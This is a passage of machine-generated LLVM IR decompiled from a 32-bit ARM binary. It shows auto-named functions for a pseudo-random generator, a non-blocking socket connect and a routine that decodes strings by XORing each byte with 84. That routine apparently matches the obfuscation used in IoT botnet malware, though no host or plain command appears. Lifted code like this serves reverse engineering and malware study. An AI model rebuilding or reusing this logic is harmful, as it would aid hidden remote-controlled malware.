  %v3_f814 = load i32, i32* %fp.global-to-local, align 4
  %v4_f814 = add i32 %v3_f814, %v2_f814
  %v5_f814 = inttoptr i32 %v4_f814 to i8*
  store i8 %v3_f810, i8* %v5_f814, align 1
  %v0_f818 = load i32, i32* @r5, align 4
  %v1_f818 = add i32 %v0_f818, 1
  store i32 %v1_f818, i32* @r5, align 4
  %v1_f81c = load i32, i32* %sb.global-to-local, align 4
  %v9_f81c = icmp eq i32 %v1_f818, %v1_f81c
  br i1 %v9_f81c, label %dec_label_pc_f824, label %dec_label_pc_f7c4.dec_label_pc_f7c4_crit_edge

dec_label_pc_f7c4.dec_label_pc_f7c4_crit_edge:    ; preds = %dec_label_pc_f7c4
  %v1_f7e8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f7c4

dec_label_pc_f824:                                ; preds = %dec_label_pc_f7c4, %dec_label_pc_f778
  %v1_f828 = call i32 @function_112dc(i32 31)
  %v2_f830 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f830, i32* @r4, align 4
  store i32 %v6_f778, i32* @r5, align 4
  store i32 %v9_f778, i32* @r6, align 4
  store i32 %v12_f778, i32* @r7, align 4
  ret i32 %v1_f828

; uselistorder directives
  uselistorder i32 %v2_f7c8, { 1, 0 }
  uselistorder i32 %v2_f7c4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
}

define i32 @function_f844(i8* %arg1) local_unnamed_addr {
dec_label_pc_f844:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_f844 = load i32, i32* @r4, align 4
  store i32 %v3_f844, i32* %stack_var_-36, align 4
  %v9_f844 = load i32, i32* @r6, align 4
  %v12_f844 = load i32, i32* @r7, align 4
  %v15_f844 = load i32, i32* @r8, align 4
  %v18_f844 = load i32, i32* @sb, align 4
  %v21_f844 = load i32, i32* @sl, align 4
  %v24_f844 = load i32, i32* @fp, align 4
  %v0_f848 = load i32, i32* @r1, align 4
  store i32 %v0_f848, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_f848, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_f844
  store i32 %v3_f844, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_f844
  store i32 ptrtoint (i32* @global_var_1a6d8.166 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6d4.170 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6d0.168 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6cc.164 to i32), i32* %r8.global-to-local, align 4
  %v2_f864 = load i32, i32* @global_var_1a6d8.166, align 4
  store i32 %v2_f864, i32* %lr.global-to-local, align 4
  %v2_f868 = load i32, i32* @global_var_1a6d4.170, align 4
  store i32 %v2_f868, i32* %r7.global-to-local, align 4
  %v2_f86c = load i32, i32* @global_var_1a6d0.168, align 4
  store i32 %v2_f86c, i32* %r6.global-to-local, align 4
  %v2_f870 = load i32, i32* @global_var_1a6cc.164, align 4
  br label %dec_label_pc_f89c

dec_label_pc_f878:                                ; preds = %dec_label_pc_f8c8
  %v3_f8d0 = sdiv i32 %v5_f8b4, 256
  %v1_f878 = trunc i32 %v3_f8d0 to i8
  %v3_f878 = add i32 %v9_f8bc, 1
  %v4_f878 = inttoptr i32 %v3_f878 to i8*
  store i8 %v1_f878, i8* %v4_f878, align 1
  %v0_f87c = load i32, i32* %r3.global-to-local, align 4
  %v1_f87c = trunc i32 %v0_f87c to i8
  %v2_f87c = load i32, i32* %r5.global-to-local, align 4
  %v3_f87c = inttoptr i32 %v2_f87c to i8*
  store i8 %v1_f87c, i8* %v3_f87c, align 1
  %v0_f880 = load i32, i32* %r5.global-to-local, align 4
  %v1_f880 = add i32 %v0_f880, 2
  store i32 %v1_f880, i32* %r5.global-to-local, align 4
  %v0_f884.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %.thread, %dec_label_pc_f878
  %v0_f884 = phi i32 [ %v9_f8c0, %.thread ], [ %v0_f884.pre, %dec_label_pc_f878 ]
  %v2_f8787 = phi i32 [ %v12_f8bc, %.thread ], [ %v1_f880, %dec_label_pc_f878 ]
  %tmp22 = icmp slt i32 %v0_f884, 1
  br i1 %tmp22, label %dec_label_pc_f904, label %dec_label_pc_f890

dec_label_pc_f890:                                ; preds = %dec_label_pc_f884
  %v0_f888 = load i32, i32* %r6.global-to-local, align 4
  %v0_f890 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_f890, i32* %r6.global-to-local, align 4
  %v0_f894 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f894, i32* %r7.global-to-local, align 4
  %v0_f898 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f898, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f89c

dec_label_pc_f89c:                                ; preds = %bb21, %dec_label_pc_f890
  %v0_f8ec = phi i32 [ %v2_f86c, %bb21 ], [ %v0_f890, %dec_label_pc_f890 ]
  %v9_f8bc = phi i32 [ %tmp, %bb21 ], [ %v2_f8787, %dec_label_pc_f890 ]
  %v0_f8d4 = phi i32 [ %v0_f848, %bb21 ], [ %v0_f884, %dec_label_pc_f890 ]
  %v0_f8e0 = phi i32 [ %v2_f864, %bb21 ], [ %v0_f898, %dec_label_pc_f890 ]
  %v0_f8dc = phi i32 [ %v2_f870, %bb21 ], [ %v0_f888, %dec_label_pc_f890 ]
  %v4_f89c = mul i32 %v0_f8dc, 2048
  %v5_f89c = xor i32 %v4_f89c, %v0_f8dc
  %v4_f8a0 = udiv i32 %v0_f8e0, 524288
  %v5_f8a0 = xor i32 %v4_f8a0, %v0_f8e0
  %v2_f8a4 = xor i32 %v5_f8a0, %v5_f89c
  %v4_f8b4 = udiv i32 %v5_f89c, 256
  %v5_f8b4 = xor i32 %v4_f8b4, %v2_f8a4
  store i32 %v5_f8b4, i32* %r3.global-to-local, align 4
  %v7_f8bc = icmp sgt i32 %v0_f8d4, 3
  br i1 %v7_f8bc, label %.thread, label %dec_label_pc_f8c8

.thread:                                          ; preds = %dec_label_pc_f89c
  %v10_f8bc = inttoptr i32 %v9_f8bc to i32*
  store i32 %v5_f8b4, i32* %v10_f8bc, align 4
  %v11_f8bc = load i32, i32* %r5.global-to-local, align 4
  %v12_f8bc = add i32 %v11_f8bc, 4
  store i32 %v12_f8bc, i32* %r5.global-to-local, align 4
  %v8_f8c0 = load i32, i32* %r4.global-to-local, align 4
  %v9_f8c0 = add i32 %v8_f8c0, -4
  store i32 %v9_f8c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f89c
  store i32 %v5_f8b4, i32* %r3.global-to-local, align 4
  %v7_f8cc = icmp eq i32 %v0_f8d4, 1
  %v1_f8d4 = add i32 %v0_f8d4, -2
  store i32 %v1_f8d4, i32* %r4.global-to-local, align 4
  br i1 %v7_f8cc, label %dec_label_pc_f8dc, label %dec_label_pc_f878

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f8c8
  store i32 %v5_f8b4, i32* %r3.global-to-local, align 4
  %v1_f8ec = load i32, i32* %r8.global-to-local, align 4
  %v2_f8ec = inttoptr i32 %v1_f8ec to i32*
  store i32 %v0_f8ec, i32* %v2_f8ec, align 4
  %v0_f8f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8f0 = load i32, i32* %sl.global-to-local, align 4
  %v2_f8f0 = inttoptr i32 %v1_f8f0 to i32*
  store i32 %v0_f8f0, i32* %v2_f8f0, align 4
  %v0_f8f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f8f4 = load i32, i32* %sb.global-to-local, align 4
  %v2_f8f4 = inttoptr i32 %v1_f8f4 to i32*
  store i32 %v0_f8f4, i32* %v2_f8f4, align 4
  %v0_f8f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_f8f8 = inttoptr i32 %v1_f8f8 to i32*
  store i32 %v0_f8f8, i32* %v2_f8f8, align 4
  %v0_f8fc = load i32, i32* %r3.global-to-local, align 4
  %v1_f8fc = trunc i32 %v0_f8fc to i8
  %v2_f8fc = load i32, i32* %r5.global-to-local, align 4
  %v3_f8fc = inttoptr i32 %v2_f8fc to i8*
  store i8 %v1_f8fc, i8* %v3_f8fc, align 1
  %v2_f900 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f900, i32* @r4, align 4
  store i32 %v9_f844, i32* @r6, align 4
  store i32 %v12_f844, i32* @r7, align 4
  store i32 %v15_f844, i32* @r8, align 4
  store i32 %v18_f844, i32* @sb, align 4
  store i32 %v21_f844, i32* @sl, align 4
  store i32 %v24_f844, i32* @fp, align 4
  ret i32 %v5_f89c

dec_label_pc_f904:                                ; preds = %dec_label_pc_f884
  %v0_f904 = load i32, i32* %r3.global-to-local, align 4
  %v1_f904 = load i32, i32* %fp.global-to-local, align 4
  %v2_f904 = inttoptr i32 %v1_f904 to i32*
  store i32 %v0_f904, i32* %v2_f904, align 4
  %v0_f908 = load i32, i32* %lr.global-to-local, align 4
  %v1_f908 = load i32, i32* %sb.global-to-local, align 4
  %v2_f908 = inttoptr i32 %v1_f908 to i32*
  store i32 %v0_f908, i32* %v2_f908, align 4
  %v0_f90c = load i32, i32* %r7.global-to-local, align 4
  %v1_f90c = load i32, i32* %sl.global-to-local, align 4
  %v2_f90c = inttoptr i32 %v1_f90c to i32*
  store i32 %v0_f90c, i32* %v2_f90c, align 4
  %v0_f910 = load i32, i32* %r6.global-to-local, align 4
  %v1_f910 = load i32, i32* %r8.global-to-local, align 4
  %v2_f910 = inttoptr i32 %v1_f910 to i32*
  store i32 %v0_f910, i32* %v2_f910, align 4
  %v2_f914 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f914, i32* @r4, align 4
  store i32 %v9_f844, i32* @r6, align 4
  store i32 %v12_f844, i32* @r7, align 4
  store i32 %v15_f844, i32* @r8, align 4
  store i32 %v18_f844, i32* @sb, align 4
  store i32 %v21_f844, i32* @sl, align 4
  store i32 %v24_f844, i32* @fp, align 4
  ret i32 %v5_f89c

; uselistorder directives
  uselistorder i32 %v9_f8c0, { 1, 0 }
  uselistorder i32 %v12_f8bc, { 1, 0 }
  uselistorder i32 %v5_f8b4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_f89c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f8dc, { 1, 0 }
  uselistorder i32 %v0_f8e0, { 1, 0 }
  uselistorder i32 %v0_f884, { 1, 0 }
  uselistorder i32 %v24_f844, { 1, 0 }
  uselistorder i32 %v21_f844, { 1, 0 }
  uselistorder i32 %v18_f844, { 1, 0 }
  uselistorder i32 %v15_f844, { 1, 0 }
  uselistorder i32 %v12_f844, { 1, 0 }
  uselistorder i32 %v9_f844, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1a6cc.164, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1a6cc.164 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1a6d0.168, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1a6d4.170, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1a6d8.166, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f89c, { 1, 0 }
}

define i32 @function_f928() local_unnamed_addr {
dec_label_pc_f928:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f928 = load i32, i32* @r4, align 4
  store i32 %v3_f928, i32* %stack_var_-16, align 4
  %v0_f92c = load i32, i32* @r0, align 4
  store i32 %v0_f92c, i32* %r5.global-to-local, align 4
  %v1_f930 = add i32 %v0_f92c, 4
  %v2_f930 = inttoptr i32 %v1_f930 to i32*
  %v3_f930 = load i32, i32* %v2_f930, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_f950 = icmp ne i32 %v3_f930, -1
  call void @__pseudo_cond_branch(i1 %v1_f950, i32 ptrtoint (i32* @global_var_8dac.158 to i32))
  %v3_f960 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f960, i32* %r3.global-to-local, align 4
  %v2_f968 = icmp eq i32 %v3_f960, -1
  store i32 256, i32* @r1, align 4
  %v0_f970 = load i32, i32* %r5.global-to-local, align 4
  %v1_f970 = add i32 %v0_f970, 28
  store i32 %v1_f970, i32* @r0, align 4
  %v2_f974 = add i32 %v0_f970, 4
  %v3_f974 = inttoptr i32 %v2_f974 to i32*
  store i32 %v3_f960, i32* %v3_f974, align 4
  br i1 %v2_f968, label %dec_label_pc_f928.dec_label_pc_f9f0_crit_edge, label %dec_label_pc_f97c

dec_label_pc_f928.dec_label_pc_f9f0_crit_edge:    ; preds = %dec_label_pc_f928
  %v14_f9f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f9f0

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f928
  %v0_f97c = load i32, i32* %r6.global-to-local, align 4
  %v1_f97c = load i32, i32* %r5.global-to-local, align 4
  %v2_f97c = add i32 %v1_f97c, 24
  %v3_f97c = inttoptr i32 %v2_f97c to i32*
  store i32 %v0_f97c, i32* %v3_f97c, align 4
  %v0_f980 = call i32 @function_11a7c()
  %v0_f984 = load i32, i32* %r5.global-to-local, align 4
  %v1_f984 = add i32 %v0_f984, 4
  %v2_f984 = inttoptr i32 %v1_f984 to i32*
  %v3_f984 = load i32, i32* %v2_f984, align 4
  %v2_f994 = call i32 (i32, i32, ...) @fcntl(i32 %v3_f984, i32 3)
  %v2_f9a4 = call i32 (i32, i32, ...) @fcntl(i32 %v3_f984, i32 4)
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %r3.global-to-local, align 4
  %v0_f9ac = load i32, i32* %r5.global-to-local, align 4
  %v2_f9b0 = load i32, i32* @global_var_1a710.184, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f9bc = add i32 %v0_f9ac, 8
  %v3_f9bc = inttoptr i32 %v2_f9bc to i32*
  store i32 %v2_f9b0, i32* %v3_f9bc, align 4
  %v0_f9c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f9c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_f9c0 = add i32 %v1_f9c0, 12
  %v3_f9c0 = inttoptr i32 %v2_f9c0 to i32*
  store i32 %v0_f9c0, i32* %v3_f9c0, align 4
  %v0_f9c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f9c8 = add i32 %v0_f9c8, 4
  %v2_f9c8 = inttoptr i32 %v1_f9c8 to i32*
  %v3_f9c8 = load i32, i32* %v2_f9c8, align 4
  %v0_f9cc = load i32, i32* %r3.global-to-local, align 4
  %v2_f9cc = mul i32 %v0_f9cc, 2
  store i32 %v2_f9cc, i32* %r3.global-to-local, align 4
  %tmp13 = bitcast i32* %stack_var_-32 to %sockaddr*
  store i32 %v2_f9cc, i32* %stack_var_-32, align 4
  %v5_f9ec = call i32 @connect(i32 %v3_f9c8, %sockaddr* %tmp13, i32 16)
  br label %dec_label_pc_f9f0

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f928.dec_label_pc_f9f0_crit_edge, %dec_label_pc_f97c
  %v14_f9f4 = phi i32 [ %v14_f9f4.pre, %dec_label_pc_f928.dec_label_pc_f9f0_crit_edge ], [ %v5_f9ec, %dec_label_pc_f97c ]
  %v2_f9f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f9f4, i32* @r4, align 4
  ret i32 %v14_f9f4

; uselistorder directives
  uselistorder i32 %v2_f9cc, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 ()* @function_11a7c, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9f0, { 1, 0 }
}

define i32 @function_f9fc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f9fc:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1a6dc.186 to i32), i32* %r8.global-to-local, align 4
  %v2_fa04 = load i32, i32* @global_var_1a6dc.186, align 4
  store i32 ptrtoint (i32* @global_var_1a708.188 to i32), i32* %sb.global-to-local, align 4
  %v3_fa10 = mul i32 %v2_fa04, 16
  store i32 %v3_fa10, i32* %r3.global-to-local, align 4
  %v3_fa18 = urem i32 %arg3, 65536
  store i32 %v3_fa18, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_fa24 = load i32, i32* @global_var_1a708.188, align 4
  %v1_fa28 = add i32 %v3_fa10, 16
  store i32 %v1_fa28, i32* %r1.global-to-local, align 4
  store i32 %v3_fa18, i32* %stack_var_-44, align 4
  %v15_fa30 = inttoptr i32 %v2_fa24 to i32*
  %v16_fa30 = call i32* @realloc(i32* %v15_fa30, i32 %v1_fa28)
  %v18_fa30 = ptrtoint i32* %v16_fa30 to i32
  store i32 %v18_fa30, i32* %sl.global-to-local, align 4
  %v0_fa38 = load i32, i32* %r5.global-to-local, align 4
  %v1_fa3c = load i32, i32* %sb.global-to-local, align 4
  %v2_fa3c = inttoptr i32 %v1_fa3c to i32*
  store i32 %v18_fa30, i32* %v2_fa3c, align 4
  %v2_fa40 = load i32, i32* @global_var_1a6dc.186, align 4
  store i32 %v2_fa40, i32* %fp.global-to-local, align 4
  %v1_fa44 = inttoptr i32 %v0_fa38 to i8*
  %v2_fa44 = call i32 @function_119dc(i8* %v1_fa44)
  %sext = mul i32 %v2_fa44, 16777216
  %v1_fa48 = sdiv i32 %sext, 16777216
  %v2_fa48 = add nsw i32 %v1_fa48, 1
  store i32 %v1_fa48, i32* %r7.global-to-local, align 4
  %v1_fa54 = call i32* @malloc(i32 %v2_fa48)
  %v3_fa54 = ptrtoint i32* %v1_fa54 to i32
  %v0_fa58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fa58, i32* %r1.global-to-local, align 4
  store i32 %v2_fa48, i32* %r2.global-to-local, align 4
  store i32 %v3_fa54, i32* %r6.global-to-local, align 4
  %v3_fa64 = call i32 @function_11a58(i32 %v3_fa54, i32 %v0_fa58, i32 %v2_fa48)
  %v0_fa68 = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_fa68, 1
  %extract.t6 = trunc i32 %v0_fa68 to i8
  br i1 %tmp21, label %dec_label_pc_fa8c, label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %dec_label_pc_f9fc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa74

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa74, %dec_label_pc_fa70
  %v2_fa7c = phi i32 [ %v1_fa80, %dec_label_pc_fa74 ], [ 0, %dec_label_pc_fa70 ]
  %v1_fa74 = load i32, i32* %r6.global-to-local, align 4
  %v2_fa74 = add i32 %v1_fa74, %v2_fa7c
  %v3_fa74 = inttoptr i32 %v2_fa74 to i8*
  %v4_fa74 = load i8, i8* %v3_fa74, align 1
  %v6_fa74 = zext i8 %v4_fa74 to i32
  %v1_fa78 = xor i32 %v6_fa74, 84
  store i32 %v1_fa78, i32* %r3.global-to-local, align 4
  %v1_fa7c = trunc i32 %v1_fa78 to i8
  store i8 %v1_fa7c, i8* %v3_fa74, align 1
  %v0_fa80 = load i32, i32* %r2.global-to-local, align 4
  %v1_fa80 = add i32 %v0_fa80, 1
  store i32 %v1_fa80, i32* %r2.global-to-local, align 4
  %v0_fa84 = load i32, i32* %r7.global-to-local, align 4
  %v9_fa84 = icmp eq i32 %v0_fa84, %v1_fa80
  br i1 %v9_fa84, label %dec_label_pc_fa8c.loopexit, label %dec_label_pc_fa74

dec_label_pc_fa8c.loopexit:                       ; preds = %dec_label_pc_fa74
  %extract.t = trunc i32 %v1_fa80 to i8
  br label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_fa8c.loopexit, %dec_label_pc_f9fc
  %v0_fa9c.off0 = phi i8 [ %extract.t, %dec_label_pc_fa8c.loopexit ], [ %extract.t6, %dec_label_pc_f9fc ]
  %v2_fa8c = load i32, i32* @global_var_1a6dc.186, align 4
  %v2_fa90 = load i32, i32* @global_var_1a708.188, align 4
  store i32 %v2_fa90, i32* %r2.global-to-local, align 4
  %v3_fa94 = mul i32 %v2_fa8c, 16
  %v2_fa98 = add i32 %v2_fa90, %v3_fa94
  store i32 %v2_fa98, i32* %r3.global-to-local, align 4
  %v3_fa9c = add i32 %v2_fa98, 12
  %v4_fa9c = inttoptr i32 %v3_fa9c to i8*
  store i8 %v0_fa9c.off0, i8* %v4_fa9c, align 1
  %v0_faa0 = load i32, i32* %r6.global-to-local, align 4
  %v1_faa0 = load i32, i32* %sl.global-to-local, align 4
  %v2_faa0 = load i32, i32* %fp.global-to-local, align 4
  %v5_faa0 = mul i32 %v2_faa0, 16
  %v6_faa0 = add i32 %v5_faa0, %v1_faa0
  %v7_faa0 = inttoptr i32 %v6_faa0 to i32*
  store i32 %v0_faa0, i32* %v7_faa0, align 4
  %v2_faa8 = load i32, i32* @global_var_1a6dc.186, align 4
  store i32 %v2_faa8, i32* %r7.global-to-local, align 4
  %v2_faac = load i32, i32* @global_var_1a708.188, align 4
  store i32 %v2_faac, i32* %sl.global-to-local, align 4
  %v1_fab0 = inttoptr i32 %arg2 to i8*
  %v2_fab0 = call i32 @function_119dc(i8* %v1_fab0)
  %sext1 = mul i32 %v2_fab0, 16777216
  %v1_fab4 = sdiv i32 %sext1, 16777216
  %v2_fab4 = add nsw i32 %v1_fab4, 1
  store i32 %v1_fab4, i32* %r5.global-to-local, align 4
  %v1_fac0 = call i32* @malloc(i32 %v2_fab4)
  %v3_fac0 = ptrtoint i32* %v1_fac0 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_fab4, i32* %r2.global-to-local, align 4
  store i32 %v3_fac0, i32* %r6.global-to-local, align 4
  %v3_fad0 = call i32 @function_11a58(i32 %v3_fac0, i32 %arg2, i32 %v2_fab4)
  %v0_fad4 = load i32, i32* %r5.global-to-local, align 4
  %tmp22 = icmp slt i32 %v0_fad4, 1
  %extract.t8 = trunc i32 %v0_fad4 to i8
  br i1 %tmp22, label %dec_label_pc_faf8, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %dec_label_pc_fa8c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %dec_label_pc_fae0, %dec_label_pc_fadc
  %v2_fae8 = phi i32 [ %v1_faec, %dec_label_pc_fae0 ], [ 0, %dec_label_pc_fadc ]
  %v1_fae0 = load i32, i32* %r6.global-to-local, align 4
  %v2_fae0 = add i32 %v1_fae0, %v2_fae8
  %v3_fae0 = inttoptr i32 %v2_fae0 to i8*
  %v4_fae0 = load i8, i8* %v3_fae0, align 1
  %v6_fae0 = zext i8 %v4_fae0 to i32
  %v1_fae4 = xor i32 %v6_fae0, 84
  store i32 %v1_fae4, i32* %r3.global-to-local, align 4
  %v1_fae8 = trunc i32 %v1_fae4 to i8
  store i8 %v1_fae8, i8* %v3_fae0, align 1
  %v0_faec = load i32, i32* %r2.global-to-local, align 4
  %v1_faec = add i32 %v0_faec, 1
  store i32 %v1_faec, i32* %r2.global-to-local, align 4
  %v0_faf0 = load i32, i32* %r5.global-to-local, align 4
  %v9_faf0 = icmp eq i32 %v0_faf0, %v1_faec
  br i1 %v9_faf0, label %dec_label_pc_faf8.loopexit, label %dec_label_pc_fae0

dec_label_pc_faf8.loopexit:                       ; preds = %dec_label_pc_fae0
  %extract.t7 = trunc i32 %v1_faec to i8
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_faf8.loopexit, %dec_label_pc_fa8c
  %v0_fb08.off0 = phi i8 [ %extract.t7, %dec_label_pc_faf8.loopexit ], [ %extract.t8, %dec_label_pc_fa8c ]
  %v2_faf8 = load i32, i32* @global_var_1a6dc.186, align 4
  %v2_fafc = load i32, i32* @global_var_1a708.188, align 4
  %v3_fb00 = mul i32 %v2_faf8, 16
  %v2_fb04 = or i32 %v3_fb00, 13
  %v3_fb08 = add i32 %v2_fb04, %v2_fafc
  %v4_fb08 = inttoptr i32 %v3_fb08 to i8*
  store i8 %v0_fb08.off0, i8* %v4_fb08, align 1
  %v2_fb10 = load i32, i32* @global_var_1a6dc.186, align 4
  store i32 %v2_fb10, i32* %lr.global-to-local, align 4
  %v4_fb14 = load i8, i8* @global_var_1a70d.191, align 1
  %v5_fb14 = zext i8 %v4_fb14 to i32
  %v3_fb18 = load i8, i8* bitcast (i8** @global_var_1a70c.190 to i8*), align 4
  %v4_fb18 = zext i8 %v3_fb18 to i32
  %v2_fb1c = load i32, i32* @global_var_1a708.188, align 4
  %v4_fb20 = mul nuw nsw i32 %v5_fb14, 256
  %v5_fb20 = or i32 %v4_fb18, %v4_fb20
  store i32 %v5_fb20, i32* %r2.global-to-local, align 4
  %v3_fb24 = mul i32 %v2_fb10, 16
  %v2_fb28 = add i32 %v2_fb1c, %v3_fb24
  store i32 %v2_fb28, i32* %r1.global-to-local, align 4
  %v3_fb30 = add i32 %v2_fb28, 9
  %v4_fb30 = inttoptr i32 %v3_fb30 to i8*
  store i8 %v4_fb14, i8* %v4_fb30, align 1
  %v0_fb34 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb34 = trunc i32 %v0_fb34 to i8
  %v2_fb34 = load i32, i32* %r1.global-to-local, align 4
  %v3_fb34 = add i32 %v2_fb34, 8
  %v4_fb34 = inttoptr i32 %v3_fb34 to i8*
  store i8 %v1_fb34, i8* %v4_fb34, align 1
  %v4_fb38 = load i8, i8* @global_var_1a70d.191, align 1
  %v5_fb38 = zext i8 %v4_fb38 to i32
  %v3_fb3c = load i8, i8* bitcast (i8** @global_var_1a70c.190 to i8*), align 4
  %v4_fb3c = zext i8 %v3_fb3c to i32
  %v4_fb40 = mul nuw nsw i32 %v5_fb38, 256
  %v5_fb40 = or i32 %v4_fb3c, %v4_fb40
  %v2_fb44 = load i32, i32* %stack_var_-44, align 4
  %v2_fb48 = add i32 %v5_fb40, %v2_fb44
  store i32 %v2_fb48, i32* %r3.global-to-local, align 4
  %v3_fb4c9 = udiv i32 %v2_fb48, 256
  %v1_fb50 = trunc i32 %v3_fb4c9 to i8
  %v2_fb50 = load i32, i32* %r1.global-to-local, align 4
  %v3_fb50 = add i32 %v2_fb50, 11
  %v4_fb50 = inttoptr i32 %v3_fb50 to i8*
  store i8 %v1_fb50, i8* %v4_fb50, align 1
  %v0_fb54 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb54 = trunc i32 %v0_fb54 to i8
  %v2_fb54 = load i32, i32* %r1.global-to-local, align 4
  %v3_fb54 = add i32 %v2_fb54, 10
  %v4_fb54 = inttoptr i32 %v3_fb54 to i8*
  store i8 %v1_fb54, i8* %v4_fb54, align 1
  %v4_fb58 = load i8, i8* @global_var_1a70d.191, align 1
  %v5_fb58 = zext i8 %v4_fb58 to i32
  %v3_fb5c = load i8, i8* bitcast (i8** @global_var_1a70c.190 to i8*), align 4
  %v4_fb5c = zext i8 %v3_fb5c to i32
  %v4_fb60 = mul nuw nsw i32 %v5_fb58, 256
  %v5_fb60 = or i32 %v4_fb5c, %v4_fb60
  %v2_fb64 = load i32, i32* %stack_var_-44, align 4
  %v2_fb68 = add i32 %v5_fb60, %v2_fb64
  store i32 %v2_fb68, i32* %r2.global-to-local, align 4
  %v0_fb6c = load i32, i32* %r7.global-to-local, align 4
  %v3_fb6c = mul i32 %v0_fb6c, 16
  %v1_fb70 = load i32, i32* %sl.global-to-local, align 4
  %v2_fb70 = add i32 %v1_fb70, %v3_fb6c
  store i32 %v2_fb70, i32* %r3.global-to-local, align 4
